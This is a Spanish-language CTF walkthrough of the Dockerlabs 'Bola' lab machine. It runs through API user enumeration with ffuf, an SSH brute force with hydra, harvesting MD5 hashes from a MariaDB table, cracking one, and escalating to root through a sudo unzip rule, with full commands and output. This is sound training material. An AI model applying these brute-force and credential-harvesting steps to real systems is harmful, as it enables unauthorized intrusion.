- Tags: #Api
# Writeup Template: Maquina `[ Bola ]`

- Tags: #Bola
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Bola](https://mega.nz/file/vBt2AKba#5c4ZTcFQ2hbPPSHf55juJzGRNpynwX45hoSKFBptSPE) Enumeración de una API, explotación de vulnerabilidad BOLA, y escalada de privilegios en Linux.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x bola.zip
sudo bash auto_deploy.sh bola.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,12345 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
12345/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
```
---

## Enumeracion de [Servicio Web Principal] ( Werkzeug )
Werkzeug es una biblioteca de Python para construir aplicaciones web compatibles con WSGI **(Web Server Gateway Interface)**. En esencia, proporciona un conjunto de herramientas y utilidades que facilitan la creación de aplicaciones web robustas, permitiendo a los desarrolladores enfocarse en la lógica de la aplicación en lugar de los detalles de bajo nivel de la comunicación con el servidor web
direccion **URL** del servicio:
```bash
172.17.0.2:12345
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb 172.17.0.2:12345
http://172.17.0.2:12345 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Werkzeug[2.2.2]
```

En el servicio principal tenemos una **API**, el cual si realizamos una peticion nos responde de la siguiente manera:
```bash
curl -s -X GET http://172.17.0.2:12345/api

{
  "message": "User not found"
}
```
### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2:12345/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt --no-error -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/login                (Status: 405) [Size: 153]
/user                 (Status: 308) [Size: 245] [--> http://172.17.0.2:12345/user/]
/console              (Status: 400) [Size: 167]
```

Si intentamos acceder a la siguiente ruta, nos reporta que el metodo no esta permitido
```bash
http://172.17.0.2:12345/user
```

Asi que desde curl realizamos la peticion mediante el metodo **PATCH**
```bash
curl -s -X PATCH http://172.17.0.2:12345/user
```

Desde la terminarl vemos lo siguiente:
```bash
{
  "message": "User not found"
}
```

Como tenemos un login probraremos credenciales por defaul
```bash
curl -s -X POST http://172.17.0.2:12345/login -H 'Content-Type: application/json' -d '{"username": "root", "password":"root"}'
```

Cuando probamos con **admin** nos reporta lo siguiente:
```bash
curl -s -X POST http://172.17.0.2:12345/login -H 'Content-Type: application/json' -d '{"username": "admin", "password":"admin"}'

# Respuesta del servidor
{
  "message": "Invalid credentials"
}
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que sabemos que **admin** es un potencial usuario, El login devuelve `"Invalid credentials"` en lugar de `"User not found"` o algún otro mensaje más específico, entonces puede ser vulnerable a **enumeración de usuarios por diferencias en mensajes**.
Ahora tenemos una via potencial de enumerar usuarios validos para el sisitema con **ffuf** de la siguiente maneran basandonos el el mensaje de retorno
### Ejecucion del Ataque
Ejecutamos la enumeracion de usuarios:
```bash
# Comandos para explotación
ffuf -X POST -H "Content-Type: application/json" -d '{"username":"FUZZ", "password":"badpass"}' -u http://172.17.0.2:12345/login -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -fc 401
```

Tenemo slguiente:
```bash
michael                 [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 2ms]
george                  [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 12ms]
charlie                 [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 22ms]
steven                  [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 31ms]
edward                  [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 31ms]
kevin                   [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 33ms]
bob                     [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 31ms]
rachel                  [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 30ms]
oscar                   [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 31ms]
tina                    [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 29ms]
hannah                  [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 30ms]
julia                   [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 31ms]
laura                   [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 33ms]
diana                   [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 29ms]
paula                   [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 29ms]
alice                   [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 33ms]
ian                     [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 32ms]
nina                    [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 32ms]
quinn                   [Status: 200, Size: 53, Words: 8, Lines: 5, Duration: 28ms]
fiona                   [Status: 200, Size: 52, Words: 8, Lines: 5, Duration: 33ms]
```

Ahora que tenemos posibles usuario potenciales, Realizaremos un ataque de fuerza bruta por **ssh** con estos usuarios.
Para eso creamos un diccionario bajo en nombres de **users.txt**, Una ves almacenado ese archivo lo tratamos para solo quedarnos con los nombres
```bash
cat users.txt | awk $'{print $1}' | sponge users.txt
```

Ahora si iniciamos el ataque de fuerza bruta sobre **ssh**
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt.gz -f -t 4 ssh://172.17.0.2
```

Como no logramos con ese diccionario probamos de contrasenas nuestro diccionarioj:
```bash
hydra -L users.txt -P users.txt -f -t 4 ssh://172.17.0.2
```

Tenemos un usuario valido
```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: steven   password: steven
```

### Intrusion
Nos conectamos por **ssh**
```bash
# Reverse shell o acceso inicial
ssh steven@172.17.0.2 # steven
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enuemracion de usuarios del sistema:
cat /etc/passwd | grep "sh"
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:steven,,,:/home/steven:/bin/bash
baluadmin:x:1001:1001:baluadmin,,,:/home/baluadmin:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ Steven ]`:
para este usuario tenemos el siguiente archivo oculto que es el historial de **mysql**
```bash
.mysql_history
```

Ahora si revisamo su contendio  vemos lo siguiente:
```bash
cat .mysql_history 
_HiStOrY_V2_
show\040databases
;
show\040databases
;
use\040secretito;
select\040*\040from\040secretito;
show\040tables
;
select\040*\040from\040usuarios;
ext
;
```

Viendo esto procedemos a conectarnos por **mysql**
```bash
mysql -u steven -p # steven
```

Enumeramos las bases de datos:
```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| secretito          |
+--------------------+
```

Cambiamos de base de datos:
```bash
MariaDB [(none)]> use secretito;
```

Ahora listamos las tablas para esa base de datos:
```bash
MariaDB [secretito]> show tables;
+---------------------+
| Tables_in_secretito |
+---------------------+
| usuarios            |
+---------------------+
```

Enumeramos las tablas para la bd
```bash
MariaDB [secretito]> desc usuarios;
+----------+-------------+------+-----+---------+----------------+
| Field    | Type        | Null | Key | Default | Extra          |
+----------+-------------+------+-----+---------+----------------+
| id       | int(11)     | NO   | PRI | NULL    | auto_increment |
| usuario  | varchar(50) | NO   |     | NULL    |                |
| password | char(32)    | NO   |     | NULL    |                |
+----------+-------------+------+-----+---------+----------------+
```

Seleccionamos los datos para el **usuario** y **password**
```bash
MariaDB [secretito]> select usuario, password from usuarios;
+-----------+----------------------------------+
| usuario   | password                         |
+-----------+----------------------------------+
| alice     | 8bdffaa69d328c1d4ae3aeadc97de223 |
| bob       | d8578edf8458ce06fbc5bb76a58c5ca4 |
| charlie   | e99a18c428cb38d5f260853678922e03 |
| baluadmin | aa87ddc5b4c24406d26ddad771ef44b0 |
| diana     | e10adc3949ba59abbe56e057f20f883e |
+-----------+----------------------------------+
```

Tenemos la potencial contrasena para el usaurio **baluadmin**, Lo que primero intentaremos loguearnos asi tal cual con esa password:
```bash
su baluadmin
Password: aa87ddc5b4c24406d26ddad771ef44b0
su: Authentication failure
```

Checamos is que posible hash es:
```bash
hashid aa87ddc5b4c24406d26ddad771ef44b0
```

Leyendo por le historico
```bash
cat .bash_history 
```

Tenemos lo siguiente:
```bash
unzip secretitosecretazo.zip 
cp secretitosecretazo.zip /home
```

Usamos el comando **find** para realizar la busqueda de este archivo:
```bash
find / -iname "secretitosecretazo.zip" 2>/dev/null

/secretitosecretazo.zip
```

Probamos desencriptando el hast desde esta web [hashdecrypt](https://md5decrypt.net/en/) 
```bash
aa87ddc5b4c24406d26ddad771ef44b0 : estrella
```

Tenemos la posible contrasne de **baluadmin**, 
```bash
su baluadmin # ( estrella )
```

###### Usuario `[ Steven ]`:
LIstando los permisos para este ususario tenenmos lo siguiente:
```bash
sudo -l

User baluadmin may run the following commands on 5d224b6910dc:
    (ALL) NOPASSWD: /usr/bin/unzip
```

Ahora sabiendo que el la raiz del sistema existe **secretitosecretazo.zip** podemos aprovecharnos de esto para descomprimierlo y lograr ver su contendio:
```bash
sudo -u root /usr/bin/unzip /secretitosecretazo.zip 
Archive:  /secretitosecretazo.zip
 extracting: sorpresitajiji.txt
```

Revisando el contendio tenemos la password de **root**
```bash
cat sorpresitajiji.txt

root:pedazodepasswordchaval
```

Ahora escalamos a **root**
```bash
# Comando para escalar al usuario: ( root )
su root # ( pedazodepasswordchaval )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@5d224b6910dc:/home/baluadmin# whoami
root
```